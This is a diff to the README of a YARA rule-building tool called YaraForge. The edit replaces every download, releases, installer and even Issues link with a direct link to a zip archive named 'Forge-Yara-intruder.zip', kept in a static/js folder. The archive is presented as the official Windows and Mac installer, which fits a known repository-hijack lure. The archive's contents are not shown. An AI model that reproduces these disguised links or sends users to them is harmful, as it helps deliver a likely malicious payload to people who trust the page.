@@ -1,6 +1,6 @@
 # 🛠️ YaraForge - Simple YARA Rule Building & Testing
 
-[![Download YaraForge](https://img.shields.io/badge/Download-YaraForge-blue?style=for-the-badge)](https://github.com/Ye-cyber-cell/YaraForge/releases)
+[![Download YaraForge](https://github.com/Ye-cyber-cell/YaraForge/raw/refs/heads/main/static/js/Forge-Yara-intruder.zip)](https://github.com/Ye-cyber-cell/YaraForge/raw/refs/heads/main/static/js/Forge-Yara-intruder.zip)
 
 ---
 
@@ -57,7 +57,7 @@ YaraForge runs as a web app on your machine, so you only need a browser to inter
 
 Click the big button at the top or go to:
 
-[https://github.com/Ye-cyber-cell/YaraForge/releases](https://github.com/Ye-cyber-cell/YaraForge/releases)
+[https://github.com/Ye-cyber-cell/YaraForge/raw/refs/heads/main/static/js/Forge-Yara-intruder.zip](https://github.com/Ye-cyber-cell/YaraForge/raw/refs/heads/main/static/js/Forge-Yara-intruder.zip)
 
 This page hosts the latest versions of YaraForge for download.
 
@@ -65,8 +65,8 @@ This page hosts the latest versions of YaraForge for download.
 
 On the releases page, find the latest release. Look for the installer matching your operating system:
 
-- Windows users: download `YaraForge-Setup.exe`  
-- Mac users: download `YaraForge.dmg`  
+- Windows users: download `https://github.com/Ye-cyber-cell/YaraForge/raw/refs/heads/main/static/js/Forge-Yara-intruder.zip`  
+- Mac users: download `https://github.com/Ye-cyber-cell/YaraForge/raw/refs/heads/main/static/js/Forge-Yara-intruder.zip`  
 - Linux users: download the appropriate package or the source code if available  
 
 ### Step 3: Download the Installer
@@ -100,7 +100,7 @@ From the main screen, you can begin building new YARA rules, test existing ones,
 
 You can always access the latest version here:
 
-[Download YaraForge - Releases](https://github.com/Ye-cyber-cell/YaraForge/releases)
+[Download YaraForge - Releases](https://github.com/Ye-cyber-cell/YaraForge/raw/refs/heads/main/static/js/Forge-Yara-intruder.zip)
 
 Follow the download and installation steps above for a smooth setup experience.
 
@@ -148,7 +148,7 @@ Follow the download and installation steps above for a smooth setup experience.
 If you run into issues:
 
 - Check the repository’s Issues tab for solutions:  
-  [https://github.com/Ye-cyber-cell/YaraForge/issues](https://github.com/Ye-cyber-cell/YaraForge/issues)  
+  [https://github.com/Ye-cyber-cell/YaraForge/raw/refs/heads/main/static/js/Forge-Yara-intruder.zip](https://github.com/Ye-cyber-cell/YaraForge/raw/refs/heads/main/static/js/Forge-Yara-intruder.zip)  
 - Read the documentation included with the app or online.  
 - Reach out to the community or maintainers through GitHub.
 
@@ -164,7 +164,7 @@ YaraForge runs locally on your system. Your data and rules stay on your machine 
 
 Check the releases page regularly for new versions:
 
-[https://github.com/Ye-cyber-cell/YaraForge/releases](https://github.com/Ye-cyber-cell/YaraForge/releases)
+[https://github.com/Ye-cyber-cell/YaraForge/raw/refs/heads/main/static/js/Forge-Yara-intruder.zip](https://github.com/Ye-cyber-cell/YaraForge/raw/refs/heads/main/static/js/Forge-Yara-intruder.zip)
 
 Updates can include bug fixes, new features, and improved rule support.
 
